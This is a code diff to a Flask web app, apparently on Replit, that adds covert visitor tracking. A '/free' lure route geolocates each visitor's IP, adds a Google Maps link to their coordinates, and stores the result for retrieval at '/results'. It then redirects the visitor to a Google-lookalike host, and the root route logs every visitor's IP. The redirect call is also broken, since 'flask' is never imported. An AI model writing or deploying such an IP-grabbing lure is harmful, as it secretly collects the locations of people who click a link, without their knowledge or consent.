@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 import scripts
 from flask import jsonify
 from datetime import datetime
@@ -6,8 +6,9 @@ import pytz
 import requests
 from replit import db
 import os
-
-
+import random
+import time
+from random import randint
 app = Flask('app')
 ip_ban_list = ['']
 
@@ -180,6 +181,7 @@ def beans2():
     "currency name": response.get("currency_name"),
     "country area": response.get("country_area"),
     "country population": response.get("country_population"),
+    "maps link": "https://www.google.com/maps/search/"+str(response.get("latitude"))+"+"+str(response.get("longitude"))+"/@42.3775,-71.9453,16z?hl=en"
   }
   return location_data
 
@@ -216,6 +218,17 @@ def get_ip():
     return request.environ['HTTP_X_FORWARDED_FOR']  # if behind a proxy
 
 
+def write_dump_2(ip, filename):
+  with open(filename, "r") as file:
+    contents = file.read()
+    list_of_contents = contents.split()
+    file.close()
+  with open (filename, "a") as file2:
+    if ip in list_of_contents:
+      pass
+    else:
+      file2.write(f"{ip}\n")
+      file2.close()
 @app.route('/data', methods=['POST', 'GET'])
 def data():
   if request.method == 'GET':
@@ -257,8 +270,32 @@ def f():
   #return beans2()
   return render_template("name_form.html")
 
+@app.route('/loc_t', methods=["GET", "POST"])
+def loc_t():
+  return beans2()
 
 ###############
+##########3
+@app.route('/free')
+def free():
+  global fish_id
+  fish_id = random.randint(0, 1000)
+  write_func(beans2(), f"discord/storage.txt")
+  write_func(f"https://hashbrownsnek.posydon.repl.co/discord/storage", "results.txt")
+  time.sleep(1)
+  #return beans2()
+  return flask.redirect("google.posydon.repl.co")
+  ########3
+
+@app.route('/results')
+def results():
+  #fish_id = random.randint(0, 1000)
+  with open(f"discord/storage.txt", "r") as file:
+    return file.read()
+  #return beans2()
+  #return "Process failed with exit code 69"
+  ########3
+  
 @app.route("/hello")
 def hello_world():
   return 'Hello, World!'
@@ -267,7 +304,7 @@ def hello_world():
 @app.route("/")
 def main():
   log()
-  write_dump(get_ip(), "ip_dump.txt")
+  write_dump_2(get_ip(), "ip_dump.txt")
   return render_template("template.html")
 
 
